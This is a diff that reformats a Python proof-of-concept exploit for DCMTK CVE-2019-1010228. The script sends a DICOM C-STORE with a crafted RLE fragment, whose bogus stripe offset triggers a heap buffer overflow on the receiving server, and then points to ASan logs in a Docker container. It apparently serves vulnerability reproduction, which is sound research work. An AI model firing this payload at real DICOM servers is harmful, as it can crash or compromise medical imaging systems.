@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PoC for DCMTK CVE-2019-1010228 (DCMTK bug #858) — heap buffer overflow
+PoC for DCMTK CVE-2019-1010228 (DCMTK bug #858) - heap buffer overflow
 (CWE-787) in the RLE codec, reached server-side by a single C-STORE-RQ
 carrying a crafted RLE Lossless image.
 
@@ -52,6 +52,7 @@ conversion" vector named in the advisory, fed by the inbound C-STORE.)
 
 Usage: poc_rle_1010228.py <host> <port>
 """
+
 import struct
 import sys
 
@@ -71,9 +72,9 @@ def build_malformed_rle_fragment():
     body. numberOfStripes=2, stripe-1 offset is bogus (0x40000000) so the
     stripe-0 inputBytes computed from the offset table is ~1 GB."""
     header = [0] * 16
-    header[0] = 2            # numberOfStripes == 2 (== BytesAllocated*Samples)
-    header[1] = 64           # stripe-0 offset: valid, right after the header
-    header[2] = 0x40000000   # stripe-1 offset: bogus -> inputBytes(s0) ~1 GB
+    header[0] = 2  # numberOfStripes == 2 (== BytesAllocated*Samples)
+    header[1] = 64  # stripe-0 offset: valid, right after the header
+    header[2] = 0x40000000  # stripe-1 offset: bogus -> inputBytes(s0) ~1 GB
     # header[3..15] = 0
     rle_header = b"".join(struct.pack("<I", v) for v in header)
 
@@ -81,7 +82,7 @@ def build_malformed_rle_fragment():
     # then try to copy 128 bytes from cp, racing off the end of this fragment.
     body = bytes([0x7F])
     fragment = rle_header + body
-    if len(fragment) % 2:                 # DICOM items must be even length
+    if len(fragment) % 2:  # DICOM items must be even length
         fragment += b"\x00"
     return fragment
 
@@ -132,11 +133,10 @@ def main():
 
     assoc = ae.associate(host, port, ae_title=b"ANY-SCP")
     if not assoc.is_established:
-        print("[!] association rejected/aborted — server did not accept RLE ctx")
+        print("[!] association rejected/aborted - server did not accept RLE ctx")
         return
     print("[+] association established (Secondary Capture / RLE Lossless)")
-    print("[*] -> C-STORE-RQ: 512x512/16-bit RLE, stripe-1 offset 0x40000000 "
-          "(inputBytes ~1 GB)")
+    print("[*] -> C-STORE-RQ: 512x512/16-bit RLE, stripe-1 offset 0x40000000 (inputBytes ~1 GB)")
     try:
         status = assoc.send_c_store(ds)
         if status:
@@ -150,10 +150,11 @@ def main():
             assoc.release()
         except Exception:
             pass
-    print("[*] Stored. The server's dcmdrle reception hook now decodes the RLE "
-          "pixel data.")
-    print("[*] Check `docker logs` for ASan heap-buffer-overflow in "
-          "DcmRLEDecoder::literal / dcrledec.h:230 (via dcrleccd.cc:301).")
+    print("[*] Stored. The server's dcmdrle reception hook now decodes the RLE pixel data.")
+    print(
+        "[*] Check `docker logs` for ASan heap-buffer-overflow in "
+        "DcmRLEDecoder::literal / dcrledec.h:230 (via dcrleccd.cc:301)."
+    )
 
 
 if __name__ == "__main__":
